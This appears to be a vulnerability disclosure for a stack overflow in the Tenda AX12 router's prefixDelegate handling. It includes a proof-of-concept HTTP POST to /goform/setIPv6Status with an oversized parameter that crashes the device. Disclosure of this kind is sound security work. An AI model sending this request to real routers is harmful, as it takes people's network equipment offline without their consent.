  # Tenda router sub_421764 function stack overflow vulnerability

> vendor:Tenda
>
> product:AX12
>
> version:v1.0 v22.03.01.16
>
> type:Stack Overflow

## Vulnerability Description

Tenda AX12 v1.0 v22.03.01.16 were discovered to contain a stack overflow via the prefixDelegate parameter in the sub_421764 function.

## Vulnerability Details

In the function, V6 obtains the variable named "prefixDelegate" in the web request and passes it directly to the strcpy function without processing, which may cause a stack buffer overflow based on V21. Therefore, by requesting this web page, an attacker can perform a denial of service attack by changing the parameter length in the post request for this page.

![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/aae59404-3d57-400c-aee7-77ec259163cf)
![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/1e8ecd69-7d86-4373-b0cd-8c27787ceadb)


## POC

    POST /goform/setIPv6Status HTTP/1.1
    Host: 192.168.244.130
    Content-Length: 103
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Origin: http://192.168.244.130
    Referer: http://192.168.244.130/index.html
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: password=cjq1qw
    Connection: close

    prefixDelegate=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
